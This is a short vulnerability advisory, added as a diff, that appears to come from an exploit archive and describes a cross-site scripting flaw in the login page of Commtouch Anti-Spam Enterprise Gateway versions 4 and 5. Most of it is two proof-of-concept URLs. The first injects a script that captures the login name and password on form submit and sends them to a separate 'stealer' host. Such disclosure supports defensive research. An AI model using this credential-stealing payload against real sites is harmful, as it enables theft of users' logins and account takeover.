@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/29957/info
+
+Commtouch Anti-Spam Enterprise Gateway is prone to a cross-site scripting vulnerability because the device fails to properly sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
+
+Commtouch Anti-Spam Enterprise Gateway 4 and 5 are vulnerable; other versions may also be affected. 
+
+http://www.example.com/AntiSpamGateway/UPM/English/login/login.asp?LoginName=XXX&LoginType=1&DIRECTTO=3&PARAMS=XXX"><script>function 
+SendCredentials(){ img = new Image(); 
+img.src="http://www.example2.com/stealer/?userid=" + 
+document.forms[0].LoginName.value + "&amp;password=" + 
+document.forms[0].LoginPass.value;} function HandleSubmit(){ 
+document.forms[0].onsubmit= SendCredentials; } window.onload = 
+HandleSubmit;</script><input%20type="hidden"%20name="Params2"%20value="x
+http://www.example.com/AntiSpamGateway/UPM/English/login/login.asp?LoginName=XXX&LoginType=1&PARAMS=XXX"><SCRIPT>PAYLOAD 
+</SCRIPT><input%20type="hidden"%20name="XXX"%20value="X
+
